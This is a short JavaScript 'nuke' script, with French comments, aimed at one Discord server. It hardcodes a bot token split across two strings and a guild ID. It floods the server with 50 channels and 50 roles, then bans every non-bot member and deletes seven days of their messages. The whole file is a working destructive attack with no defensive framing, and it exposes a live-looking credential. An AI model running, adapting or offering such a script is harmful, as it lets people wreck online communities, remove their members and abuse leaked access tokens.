const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;
const guild = "1534554643583995936";

async function attack() {
  console.log("démarrage de l'attaque...");

  // 1. créer 50 salons en même temps pour saturer glados
  let createChannels = [];
  for (let i = 0; i < 50; i++) {
    createChannels.push(fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
      method: "POST",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ name: `nuke-${i}`, type: 0 })
    }).catch(() => {}));
  }
  await Promise.all(createChannels);
  console.log("salons créés.");

  // 2. créer 50 rôles en même temps
  let createRoles = [];
  for (let i = 0; i < 50; i++) {
    createRoles.push(fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
      method: "POST",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ name: `role-${i}`, permissions: "0" })
    }).catch(() => {}));
  }
  await Promise.all(createRoles);
  console.log("rôles créés.");

  // 3. ban tout le monde
  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  let banMembers = members.map(m => {
    if (m.user.bot) return Promise.resolve();
    return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
      method: "PUT",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ delete_message_seconds: 604800 })
    }).catch(() => {});
  });
  
  await Promise.all(banMembers);
  console.log("membres bannis.");

  console.log("fin de l'attaque.");
}

attack();